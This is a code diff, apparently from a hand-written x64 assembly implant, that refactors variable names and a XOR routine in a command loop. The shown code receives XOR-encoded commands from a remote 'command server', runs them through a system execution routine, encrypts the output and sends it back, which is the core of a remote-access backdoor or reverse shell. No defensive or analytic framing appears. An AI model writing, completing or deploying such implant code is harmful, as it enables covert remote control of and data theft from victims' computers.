@@ -48,7 +48,7 @@ system_exec proto   fastcall :qword, :qword
 .code
 
     main proc
-        local command_buffer:shellcode_msg
+        local command_message:shellcode_msg
         local output_buffer[buffer_size]:byte
         local wsa_data:wsadata
         local sock_addr:sockaddr_in
@@ -86,10 +86,10 @@ system_exec proto   fastcall :qword, :qword
         ; Enter command loop
         mov retries, 0
         .while retries < max_retries -1
-            invoke RtlZeroMemory, addr command_buffer, sizeof command_buffer
+            invoke RtlZeroMemory, addr command_message, sizeof command_message
 
             ; Receive instructions from the command server
-            invoke recv, dw_socket, addr command_buffer, sizeof command_buffer, 0
+            invoke recv, dw_socket, addr command_message, sizeof command_message, 0
             .if eax == socket_error || eax == 0
                 mov eax, retries
                 inc eax
@@ -98,7 +98,7 @@ system_exec proto   fastcall :qword, :qword
             .endif
 
             ; Check what command was sent
-            lea rax, command_buffer
+            lea rax, command_message
             cmp [rax].shellcode_msg.command, cmd_wait
             je _wait
             cmp [rax].shellcode_msg.command, cmd_exit
@@ -108,10 +108,10 @@ system_exec proto   fastcall :qword, :qword
             .continue
         _exec:
             ; Decode the command buffer 
-            invoke xor_cipher, addr command_buffer.shellcode_msg.buffer, command_buffer.shellcode_msg.key, command_buffer.shellcode_msg.buffer_length
+            invoke xor_cipher, addr command_message.shellcode_msg.buffer, command_message.shellcode_msg.key, command_message.shellcode_msg.buffer_length
 
             ; Execute the command
-            invoke system_exec, addr command_buffer.shellcode_msg.buffer, addr output_buffer
+            invoke system_exec, addr command_message.shellcode_msg.buffer, addr output_buffer
             .if eax == status_failure
                 mov eax, retries
                 inc eax
@@ -121,7 +121,7 @@ system_exec proto   fastcall :qword, :qword
 
             ; Encrypt the response
             mov bytes_read, eax
-            invoke xor_cipher, addr output_buffer, command_buffer.shellcode_msg.key, bytes_read
+            invoke xor_cipher, addr output_buffer, command_message.shellcode_msg.key, bytes_read
 
             ; Post the result back to the server
             invoke send, dw_socket, addr output_buffer, bytes_read, 0
@@ -240,14 +240,12 @@ system_exec proto   fastcall :qword, :qword
             ret
     system_exec endp
 
-    xor_cipher proc fastcall buffer_addr:qword, key:byte, xor_buffer_size:dword
+    xor_cipher proc fastcall xor_buffer_addr:qword, xor_cipher_key:byte, xor_buffer_size:dword
         xor eax, eax
     _loop:
         cmp eax, r8d
         je _done
-        mov r9b, byte ptr [rcx + rax]
-        xor r9b, dl
-        mov byte ptr [rcx + rax], r9b
+        xor byte ptr [rcx + rax], dl
         inc eax
         jmp _loop
     _done:
